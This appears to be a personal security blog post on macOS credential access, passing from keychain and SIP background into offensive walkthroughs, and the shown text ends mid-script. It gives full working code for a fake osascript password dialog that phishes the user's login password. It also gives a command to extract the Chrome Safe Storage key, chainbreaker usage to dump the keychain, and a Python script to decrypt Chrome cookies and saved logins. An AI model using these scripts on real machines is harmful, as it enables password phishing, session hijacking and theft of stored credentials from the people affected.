<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="credential access in macOS">

    
        <title>credential access in macOS | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.6f40ec7b8baa6b4858deb6d2433606e0c74c60aa022d42f0d84457862cc005f3.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    credential access in macOS
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 8, 2024 &nbsp;&nbsp; m. jan 29, 2024</span>
      

  </div>
</div>




<main><p>credential management in macOS is not dissimilar to that in Windows, but with some additional quirks. let&rsquo;s take a look at some of the ways they can be accessed, both legitimately and illegitimately.</p>
<h1 id="securityd">securityd</h1>
<p>credentials are managed by the <code>securityd</code> process, and stored in the &ldquo;keychain&rdquo;. <code>securityd</code> is a daemon (i.e. a background process) that maintains different security contexts and handles the various cryptographic operations in macOS. it manages access to the items in the keychain, as well as Security Authorizations.</p>
<p><code>securityd</code> doesn&rsquo;t directly store the date, but it does route all access to keychain items (which is where passwords, encryption keys, and certificates) are all stored. this way, private keys remain out of the user process address space and access to the data is controlled by <code>securityd</code>. the authorization database, located at <code>/etc/authorization</code>, contains the rules that <code>securityd</code> enforces for various operations.</p>
<p>it&rsquo;s important to note that users don&rsquo;t interact directly with <code>securityd</code>. it&rsquo;s also important to note that <code>securityd</code> collaborates with other daemons to maintain the separation and security, like <code>trustd</code> for certificate validation and <code>nsurlsessiond</code> for real-time validity checks.</p>
<p>so, what exactly does it store?</p>
<p>as mentioned earlier, <code>securityd</code> manages access to the keychain, and is reponsible for the keychain&rsquo;s encryption. the keychain (which is implemented as a SQLite database stored on the file system) is encrypted using a <a href="https://support.apple.com/en-ca/guide/security/secb0694df1a/web"  target="_blank" rel="noreferrer nofollow">derived key</a>
. the encryption key for the login keychain is derived from the user&rsquo;s password, and the key for the system keychain is known as a Master Key, which is stored separately from the keychain itself.</p>
<p>basically, <code>securityd</code> doesn&rsquo;t store the PBKDF2 value of the user&rsquo;s password directly, but it does manage a system of derived keys, access controls, and encryption to protect the contents of the keychain. the actual encryption keys are generated as needed and kept secure within the <code>securityd</code> process or hardware security modules.</p>
<p>in the old days [&lt;v10.11], users could obtain task ports for native apps and processes. these task ports would give complete control of the process to whoever was requesting them, and would grant read/write access to process memory. then, SIP was introduced.</p>
<p>SIP (<strong>System Integrity Protection</strong>) was designed to prevent malware from modifying protected files + folders. it protects several key system locations, like <code>/System</code>, <code>/usr</code> (but not <code>/usr/local</code>), <code>/bin</code>, <code>/sbin</code>, <code>/var</code>, and most pre-installed macOS apps. it restricts root access to these protected areas, thereby preventing code injection into system processes. it also limits runtime attachment and <code>DTrace</code> for protected executables, and sanitizes certain environment variables when calling system programs.</p>
<p>SIP is enabled by default, but it can be disabled (or bypassed). to check its status, just type the following into the terminal: <code>csrutil status</code></p>
<p>for (legitimate) app developers, the method to get access to credentials is simple: prompts. however, this method isn&rsquo;t ideal for adversaries because it requires some level of elevated credentials. as always, we might be able to use this to our advantage.</p>
<p><p class="imgp">
  <img loading="lazy" src="image-prompt.png" alt="alt text"  />
</p>
</p>
<h1 id="credential-acces-via-prompts">credential acces via prompts</h1>
<p>users have become increasingly trained to authenticate to any popup on their machine. this leads us to an obvious next-step: create custom popup messages to ask for authentication, and record the credentials entered.</p>
<p>first, set up the scripting environment by initializing <code>osascript</code> with javascript.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>osascript -l JavaScript -i
</span></span></code></pre></div><p>inside the new environment, create an <code>app</code> object that represents the current application and enables standard additions, which allows us to use the dialog functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> app <span style="color:#ff79c6">=</span> Application.currentApplication()
</span></span><span style="display:flex;"><span>app.includeStandardAdditions <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>
</span></span></code></pre></div><p>now, for the main function. in OSA JavaScript, the <code>run()</code> function is the entry point of the script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> run() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>using shell commands, get the user&rsquo;s full name + username.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> fullName <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;id -F&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> username <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;whoami&#39;</span>)
</span></span></code></pre></div><p>define the title, text, default answer, and icon for the dialog. these will be displayed to the user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> title <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hello </span><span style="color:#f1fa8c">${</span>fullname<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hi </span><span style="color:#f1fa8c">${</span>username<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, please enter your password:`</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> answer <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> icon <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;caution&#34;</span>
</span></span></code></pre></div><p>display the dialog, and wrap it in a try-catch block to handle cancellations or errors.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> propmpt <span style="color:#ff79c6">=</span> app.displayDialog(text, {
</span></span><span style="display:flex;"><span>        defaultAnswer<span style="color:#ff79c6">:</span> answer,
</span></span><span style="display:flex;"><span>        buttons<span style="color:#ff79c6">:</span> [<span style="color:#f1fa8c">&#39;OK&#39;</span>, <span style="color:#f1fa8c">&#39;Cancel&#39;</span>],
</span></span><span style="display:flex;"><span>        defaultButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>,
</span></span><span style="display:flex;"><span>        cancelButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Cancel&#39;</span>,
</span></span><span style="display:flex;"><span>        withTitle<span style="color:#ff79c6">:</span> title,
</span></span><span style="display:flex;"><span>        withIcon<span style="color:#ff79c6">:</span> icon,
</span></span><span style="display:flex;"><span>        hiddenAnswer<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (err){
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// handle errors
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the user should now enter their input (password) and click OK. if they click OK, this next bit will capture their input, display a confirmation, and return the input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (prompt.buttonReturned <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> userInput <span style="color:#ff79c6">=</span> prompt.textReturned
</span></span><span style="display:flex;"><span>    app.displayAlert(<span style="color:#f1fa8c">`Password entered`</span>, {
</span></span><span style="display:flex;"><span>        message<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, your password has been securely recorded.`</span>,
</span></span><span style="display:flex;"><span>        as<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;informational&#34;</span>
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> userInput
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the next bit is something that should never happen: display the password as a &ldquo;debugging&rdquo; comment.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">null</span>) {
</span></span><span style="display:flex;"><span>    app.displayDialog(<span style="color:#f1fa8c">`Debug: The entered password was &#34;</span><span style="color:#f1fa8c">${</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;`</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>here it is in action.</p>
<p><p class="imgp">
  <img loading="lazy" src="/credential-prompt.png" alt="prompted"  />
</p>
</p>
<p><p class="imgp">
  <img loading="lazy" src="/credential-recorded.png" alt="recorded"  />
</p>
</p>
<p><p class="imgp">
  <img loading="lazy" src="/credential-revealed.png" alt="revealed"  />
</p>
</p>
<p>here&rsquo;s the full code if you want to try it yourself!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> app <span style="color:#ff79c6">=</span> Application.currentApplication()
</span></span><span style="display:flex;"><span>app.includeStandardAdditions <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> run() {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Get the current user&#39;s full name
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> fullName <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;id -F&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Get the current user&#39;s username
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> username <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;whoami&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> title <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hello </span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hi </span><span style="color:#f1fa8c">${</span>username<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, please enter your password:`</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> answer <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> icon <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;caution&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> prompt <span style="color:#ff79c6">=</span> app.displayDialog(text, {
</span></span><span style="display:flex;"><span>            defaultAnswer<span style="color:#ff79c6">:</span> answer,
</span></span><span style="display:flex;"><span>            buttons<span style="color:#ff79c6">:</span> [<span style="color:#f1fa8c">&#39;OK&#39;</span>, <span style="color:#f1fa8c">&#39;Cancel&#39;</span>],
</span></span><span style="display:flex;"><span>            defaultButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>,
</span></span><span style="display:flex;"><span>            cancelButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Cancel&#39;</span>,
</span></span><span style="display:flex;"><span>            withTitle<span style="color:#ff79c6">:</span> title,
</span></span><span style="display:flex;"><span>            withIcon<span style="color:#ff79c6">:</span> icon,
</span></span><span style="display:flex;"><span>            hiddenAnswer<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (prompt.buttonReturned <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> userInput <span style="color:#ff79c6">=</span> prompt.textReturned
</span></span><span style="display:flex;"><span>            app.displayAlert(<span style="color:#f1fa8c">`Password entered`</span>, {
</span></span><span style="display:flex;"><span>                message<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, your password has been securely recorded.`</span>,
</span></span><span style="display:flex;"><span>                as<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;informational&#34;</span>
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> userInput  <span style="color:#6272a4">// This will be the result of the run() function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (err) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (err.errorNumber <span style="color:#ff79c6">===</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">128</span>) {
</span></span><span style="display:flex;"><span>            app.displayAlert(<span style="color:#f1fa8c">&#34;Dialog cancelled&#34;</span>, {
</span></span><span style="display:flex;"><span>                message<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, you cancelled the password entry.`</span>,
</span></span><span style="display:flex;"><span>                as<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;warning&#34;</span>
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> err
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>  <span style="color:#6272a4">// Return null if cancelled or an error occurred
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Execute the function and store the result
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">const</span> result <span style="color:#ff79c6">=</span> run()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Display the result (be careful with this in a real scenario!)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">null</span>) {
</span></span><span style="display:flex;"><span>    app.displayDialog(<span style="color:#f1fa8c">`Debug: The entered password was &#34;</span><span style="color:#f1fa8c">${</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;`</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="credential-access-via-chrome-cookies">credential access via chrome cookies</h1>
<p>browser cookies are a highly valuable vector for attackers. cookies contain session identifiers that allow users to stay logged in, so if an attacker <a href="https://eitca.org/cybersecurity/eitc-is-wasf-web-applications-security-fundamentals/session-attacks/cookie-and-session-attacks/examination-review-cookie-and-session-attacks/how-can-an-attacker-steal-a-users-cookies-using-a-http-get-request-embedded-in-an-image-source/"  target="_blank" rel="noreferrer nofollow">steals them</a>
, they can impersonate the user without needing credentials.</p>
<p>armed with valid session cookes, attackers can also <a href="https://www.techtarget.com/searchsecurity/definition/cookie-poisoning"  target="_blank" rel="noreferrer nofollow">bypass MFA</a>
 because the system assumes the user has already completed the MFA process. let&rsquo;s see how we can steal some cookies!</p>
<p>the &ldquo;big 3&rdquo; browsers store their cookies in different locations.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>safari: ~/Library/Safari/LocalStorage/*
</span></span><span style="display:flex;"><span>firefox: ~/Library/Application Support/Firefox/Profiles/*.default/cookies.sqlite
</span></span><span style="display:flex;"><span>chrome: ~/Library/Application Support/Google/Chrome/Default/Cookies
</span></span></code></pre></div><p>chrome encrypts important user data files (cookies, passwords, payment information, authentication tokens) with a key stored in the user&rsquo;s login keychain. this key is stored under <code>Chrome Safe Storage</code> in the keychain, and is base64 encoded.</p>
<p>to retrieve the key, just use the following command: <code>security find-generic-password -wa &quot;Chrome Safe Storage&quot;</code></p>
<p>this retrieved key can be used directly in the base64-encoded form for decryption operations.</p>
<p>using <a href="https://github.com/n0fate/chainbreaker"  target="_blank" rel="noreferrer nofollow">chainbreaker</a>
, you can extract a bunch of information from your macOS keychain. all you have to do is provide the path to your login keychain (usually at <code>~/Library/Keychains/login.keychain-db</code>), and chainbreaker will output a bunch of decrypted information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m chainbreaker -pa ~/Library/Keychains/login.keychain-db -o output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>grep -C <span style="color:#bd93f9">20</span> <span style="color:#f1fa8c">&#34;Chrome Safe Storage&#34;</span> output.log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Generic Password Record
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Create DateTime: 2023-11-15 18:32:14
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Last Modified DateTime: 2023-11-15 18:32:14
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Description: 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Creator: b<span style="color:#f1fa8c">&#39;aapl&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Type: 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Print Name: b<span style="color:#f1fa8c">&#39;Chrome Safe Storage&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Alias: 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Account: b<span style="color:#f1fa8c">&#39;Chrome&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Service: b<span style="color:#f1fa8c">&#39;Chrome Safe Storage&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Base64 Encoded Password: b<span style="color:#f1fa8c">&#39;&lt;redacted&gt;&#39;</span>
</span></span></code></pre></div><p>using the base64 safe storage key, and the following script, you can decrypt the cookies + login data, and get a JSON output. you&rsquo;ll need to provide the path to your login data: <code>login_data = ~/Library/Application Support/Google/Chrome/Default/Login Data</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sqlite3
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os.path
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> Crypto.Cipher <span style="color:#ff79c6">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> Crypto.Protocol.KDF <span style="color:#ff79c6">import</span> PBKDF2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>salt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;saltysalt&#39;</span>
</span></span><span style="display:flex;"><span>cookie_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>login_data <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>chrome_secret <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>iv <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">16</span>
</span></span><span style="display:flex;"><span>length <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">chrome_decrypt</span>(encrypted_value, key<span style="color:#ff79c6">=</span><span style="color:#ff79c6">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Encrypted cookies should be prefixed with &#39;v10&#39; according to the</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Chromium code. Strip it off.</span>
</span></span><span style="display:flex;"><span>    encrypted_value <span style="color:#ff79c6">=</span> encrypted_value[<span style="color:#bd93f9">3</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Strip padding by taking off number indicated by padding</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># eg if last is &#39;\x0e&#39; then ord(&#39;\x0e&#39;) == 14, so take off 14.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># You&#39;ll need to change this function to use ord() for python2.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">clean</span>(x):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> x[:<span style="color:#ff79c6">-</span>x[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf8&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(key, AES<span style="color:#ff79c6">.</span>MODE_CBC, IV<span style="color:#ff79c6">=</span>iv)
</span></span><span style="display:flex;"><span>    decrypted <span style="color:#ff79c6">=</span> cipher<span style="color:#ff79c6">.</span>decrypt(encrypted_value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> clean(decrypted)
</span></span><span style="display:flex;"><span>my_pass <span style="color:#ff79c6">=</span> chrome_secret<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf8&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#my_pass = my_pass.encode(&#39;utf8&#39;)</span>
</span></span><span style="display:flex;"><span>iterations <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1003</span>
</span></span><span style="display:flex;"><span>cookie_file <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>expanduser(cookie_path)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Generate key from values above</span>
</span></span><span style="display:flex;"><span>key <span style="color:#ff79c6">=</span> PBKDF2(my_pass, salt, length, iterations)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">diagnose_database</span>(db_path):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>exists(db_path):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: The file </span><span style="color:#f1fa8c">{</span>db_path<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> does not exist.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(db_path)
</span></span><span style="display:flex;"><span>        cursor <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Check if the file is a valid SQLite database</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT sqlite_version();&#34;</span>)
</span></span><span style="display:flex;"><span>        version <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchone()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> version:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Valid SQLite database. Version: </span><span style="color:#f1fa8c">{</span>version[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;The file doesn&#39;t appear to be a valid SQLite database.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># List all tables in the database</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39;;&#34;</span>)
</span></span><span style="display:flex;"><span>        tables <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> tables:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Tables in the database:&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> table <span style="color:#ff79c6">in</span> tables:
